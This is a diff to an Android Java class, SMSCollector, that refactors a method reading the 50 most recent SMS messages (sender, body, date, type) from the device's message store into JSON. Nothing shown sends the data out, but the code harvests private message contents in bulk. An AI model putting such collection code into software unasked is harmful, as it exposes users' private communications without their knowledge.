@@ -4,6 +4,7 @@ import android.content.ContentResolver;
 import android.content.Context;
 import android.database.Cursor;
 import android.net.Uri;
+import android.provider.Telephony;
 
 import org.json.JSONArray;
 import org.json.JSONObject;
@@ -17,28 +18,24 @@ public class SMSCollector {
 
     public JSONArray collectSMS() {
         JSONArray messages = new JSONArray();
-        ContentResolver cr = context.getContentResolver();
-        Cursor cursor = cr.query(Uri.parse("content://sms/"), null, null, null, "date DESC LIMIT 100");
-        
-        if (cursor != null) {
-            int addressIndex = cursor.getColumnIndex("address");
-            int bodyIndex = cursor.getColumnIndex("body");
-            int dateIndex = cursor.getColumnIndex("date");
-            int typeIndex = cursor.getColumnIndex("type");
+        try {
+            ContentResolver cr = context.getContentResolver();
+            Cursor cursor = cr.query(Telephony.Sms.CONTENT_URI, null, null, null, 
+                Telephony.Sms.DATE + " DESC LIMIT 50");
             
-            while (cursor.moveToNext()) {
-                try {
+            if (cursor != null) {
+                while (cursor.moveToNext()) {
                     JSONObject msg = new JSONObject();
-                    msg.put("address", cursor.getString(addressIndex));
-                    msg.put("body", cursor.getString(bodyIndex));
-                    msg.put("date", cursor.getLong(dateIndex));
-                    msg.put("type", cursor.getInt(typeIndex));
+                    msg.put("address", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)));
+                    msg.put("body", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY)));
+                    msg.put("date", cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE)));
+                    msg.put("type", cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE)));
                     messages.put(msg);
-                } catch (Exception e) {
-                    e.printStackTrace();
                 }
+                cursor.close();
             }
-            cursor.close();
+        } catch (Exception e) {
+            e.printStackTrace();
         }
         return messages;
     }
